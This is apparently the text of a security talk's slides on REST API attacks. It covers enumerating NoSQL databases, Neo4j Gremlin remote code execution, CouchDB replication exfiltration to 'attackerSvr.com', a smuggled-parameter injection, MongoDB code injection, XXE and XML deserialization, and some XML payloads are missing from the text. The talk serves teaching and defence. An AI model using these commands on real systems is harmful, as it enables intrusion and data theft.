• Compare this to: 
– Select * from all_tables   (in Oracle) 
– sp_msforeachdb 'select "?" AS db, * from [?].sys.tables'     
(SQL Server) 
– SELECT DISTINCT TABLE_NAME FROM 
INFORMATION_SCHEMA.COLUMNS WHERE 
COLUMN_NAME IN ('columnA','ColumnB') AND 
TABLE_SCHEMA='YourDatabase';    (My SQL) 
– Etc. 
Especially for NoSQL REST APIs 
• All of the following DBs have REST APIs which 
closely follow their database object structures 
– HBase 
– Couch DB 
– Mongo DB 
– Cassandra.io 
– Neo4j 
HBase REST API 
• Find all the tables in the Hbase Cluster: 
– http://host:9000/ 
• Find the running HBase version: 
– http://host:9000/version 
• Find the nodes in the HBase Cluster: 
– http://host:9000/status/cluster 
• Find a description of a particular table’s 
schema(pick one from the prior link): 
– http://host:port/profile/schema 
Couch DB REST API 
• Find Version 
– http://host:5984 
• Find all databases in the Couch DB: 
– http://host:5984/_all_dbs 
• Find all the documents in the Couch DB: 
– http://host:5984/{db_name}/_all_docs 
Neo4j REST API 
• Find version and extension information in the 
Neo4j DB: 
– http://host:7474/db/data/ 
Mongo DB REST API 
• Find all databases in the Mongo DB: 
– http://host:27080/ 
– http://host:27080/api/1/databases 
• Find all the collections under a named database 
({db_name}) in the Mongo DB: 
– http://host:27080/api/1/database/{db_name}/collect
ions 
Cassandra.io REST API 
• Find all keyspaces in the Cassandra.io DB: 
– http://host:port/1/keyspaces 
• Find all the column families in the 
Cassandra.io DB: 
– http://host:port/1/columnfamily/{keyspace_name
} 
Inbred Architecture 
• Externally exposed 
REST APIs typically use 
the same 
communication 
protocol (HTTP) and 
REST frameworks that 
are used in internal 
only REST APIs. 
• Any vulnerabilities 
which are present in 
the public REST API 
can be used against 
the internal REST APIs. 
Pub REST API 
Internal DB 
Internal REST 
API 
Extensions in REST frameworks that enhance 
development of REST functionality at the expense 
of security 
• Turns remote code execution and data exfiltration 
from a security vulnerability into a feature. 
– In some cases it is subtle:   
• Passing in partial script blocks used in evaluating the processing 
of nodes. 
• Passing in JavaScript functions which are used in map-reduce 
processes. 
– In others it is more obvious: 
• Passing in a complete Groovy script which is executed as a part 
of the request on the server.  Gremlin Plug-in for Neo4j. 
• Passing in the source and target URLs for data replication 
Rest Extensions Remote Code 
Execution(Demo) 
• curl -X POST 
http://localhost:7474/db/data/ext/GremlinPlugi
n/graphdb/execute_script -d  
'{"script":"import java.lang.Runtime;rt = 
Runtime.getRuntime().exec(\"c:/Windows/System3
2/calc.exe\")", "params": {} }'  
-H "Content-Type: application/json" 
Rest Extensions Data Exfiltration Example 
(Couch DB) 
• curl –X POST 
http://internalSrv.com:5984/_replicate –d 
‘{“source”:”db_name”, 
“target”:”http://attackerSvr.com:5984/corpData”
}’ –H “Content-Type: application/json” 
• curl –X POST http://srv.com:5984/_replicate –d 
‘{“source”:”http://anotherInternalSvr.com:5984/
db”, 
“target”:”http://attackerSvr.com:5984/corpData”
}’ –H “Content-Type: application/json” 
Rest Extensions Data Exfiltration Apply 
Your Knowledge(Couch DB) 
String id = request.getParameter(“id”); 
URL urlPost = new 
URL(“http://svr.com:5984/customers/” + id); 
String name = request.getParameter(“name”); 
String json = “{\”fullName\”:\”” + name + “\”}”; 
How can you exfiltrate the data given the above? 
Rest Extensions Data Exfiltration Apply 
Your Knowledge(Couch DB) 
String id = request.getParameter(“id”); 
URL url = new 
URL(“http://svr.com:5984/customers/../_replicate”); 
String name = request.getParameter(“name”); 
String json = “{\”fullName\”:\”X\”, 
\”source\”:\”customers\”, 
\”target\”:\”http://attackerSvr.com:5984/corpData\”}”; 
Attacker provides: 
id = “../_replicate” 
name = ‘X”, “source”:”customers”, 
“target”:”http://attackerSvr.com:5984/corpData’ 
Reliance on incorrectly implemented 
protocols (SAML, XML Signature, XML 
Encryption, etc.) 
• SAML, XML Signature, XML Encryption can be subverted 
using wrapping based attacks.* 
See: How to Break XML Encryption by Tibor Jager and Juraj 
Somorovsky, On Breaking SAML: Be Whoever You Want to Be 
by Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco 
Kampmann, and Meiko Jensen, and How To Break XML 
Signature and XML Encryption by Juraj Somorovsky (OWASP 
Presentation)   
Incorrect assumptions of REST 
application behavior 
• REST provides for dynamic URLs and dynamic 
resource allocation 
REST provides for dynamic URLs and 
dynamic resource allocation  
Example Case Study 
• You have an Mongo DB REST API which exposes two 
databases which can only be accessed at /realtime/* 
and /predictive/* 
• There are two static ACLs which protect all access to 
each of these databases 
Realtime User      /realtime/* 
Predictive Analysis User      
/predicitive/*  
Can anyone see the problem?  You should be able to 
own the server with as little disruption to the existing 
databases. 
Example Case Study Exploit 
• The problem is not in the two databases.  The 
problem is that you are working with a REST API 
and resources are dynamic. 
• So POST to the following url to create a new 
database called test which is accessible at 
“/test”: 
POST http://svr.com:27080/test 
• Then POST the following: 
POST http://svr.com:27080/test/_cmd 
– With the following body: 
cmd={…, “$reduce”:”function (obj, prev) { 
malicious_code() }” … 
REST Input Types and Interfaces 
• Does anyone know what the main input types 
are to REST interfaces? 
REST Input Types and Interfaces 
• Does anyone know what the main input types 
are to REST interfaces? 
– XML and JSON 
XML Related Vulnerabilities 
• When you think of XML--what vulnerabilities 
come to mind? 
XML Related Vulnerabilities 
• When you think of XML--what vulnerabilities 
come to mind? 
– XXE (eXternal XML Entity Injection) / SSRF (Server 
Side Request Forgery) 
– XSLT Injection 
– XDOS 
– XML Injection 
– XML Serialization  
XXE (File Disclosure and Port Scanning) 
• Most REST interfaces take raw XML to de-serialize into method 
parameters of request handling classes. 
• XXE Example when the name element is echoed back in the 
HTTP response to the posted XML which is parsed whole by the 
REST API: 
]> 
&y; 
*See Attacking  processing by Nicolas Gregoire (Agarri) 
and XML Out-of-Band Data Retrieval by Timur Yunusov and Alexey 
Osipov 
XXE (Remote Code Execution) 
• Most REST interfaces take raw XML to de-serialize into method 
parameters of request handling classes. 
• XXE Example when the name element is echoed back in the 
HTTP response to the posted XML which is parsed whole by the 
REST API: 
 ]> 
&y; 
*See XXE: advanced exploitation, d0znpp, ONSEC 
*expect protocol requires pexpect module to be loaded in PHP 
*joernchen has another example at 
https://gist.github.com/joernchen/3623896 
XXE Today 
• At one time most REST frameworks were 
vulnerable to XXE 
• But newer versions have patched this 
vulnerability. 
• For more information Timothy Morgan is giving a talk at 
AppSec USA titled, “What You Didn’t Know About XML 
External Entities Attacks”. 
XML Serialization Vulns 
• Every REST API allows the raw input of XML to be 
converted to native objects.  This deserialization 
process can be used to execute arbitrary code on 
the REST server. 
Understanding XML Serialization 
• Mainly Three Mechanisms Used by Server Logic 
– Server looks where to go before going 
• Create an object based on the target type defined in the 
application then assign values from the xml to that instance 
– Server asks user where to go 
• Create and object based on a user specified type in the 
provided XML then assign values (to public or private fields) 
from the xml to that instance, finally cast the created object to 
the target type defined in the application 
– Server asks user where to go and what to do 
• Create and object based on a user specified type in the 
provided XML then assign values from the xml to that instance, 
allow object assignments and invoke arbitrary methods on the 
newly created instance, finally cast the created object to the 
target type defined in the application 
Vulnerable XML Serialization APIs 
• In our research we found one API that “asks the 
user where to go”: 
– XStream 
• More limited  
• Cannot invoke methods 
• Relies on existing APIs to trigger the code execution 
• And another that “asks the user where to go and 
what to do”: 
– XMLDecoder 
• Unrestricted  
• execute arbitrary methods on newly created objects which are 
defined in the input  
• Near Turning complete 
XML Serialization Remote Code 
Execution – XStream (Demo) 
• new XStreamRepresentation(…) 
•  
• Alvaro Munoz figured this out 
XML Serialization Remote Code 
Execution – XMLDecoder(Demo) 
•
new ObjectRepresentation 
•
Direct Usage of XMLDecoder* 
XMLDecoder dec = new XMLDecoder( 
new ByteArrayInputStream(bad_bytes));  
values = (List) dec.readObject(); 
•
If you notice that XMLDecoder file is processed by backend systems 
then you have a serious compromise by anyone who maliciously 
controls the XML 
– Look for the following in your XML 
*Modified Version of code from the chapter “A RESTful version of the Team 
Services” of “Java Web Services: Up and Running” by Martin Kalin 
XML Serialization Remote Shell (Demo) 
Conclusion 
• By now you should agree that  
publically exposed or internal REST APIs 
probably have remote code execution or data 
exfiltration issues. 
Questions 
?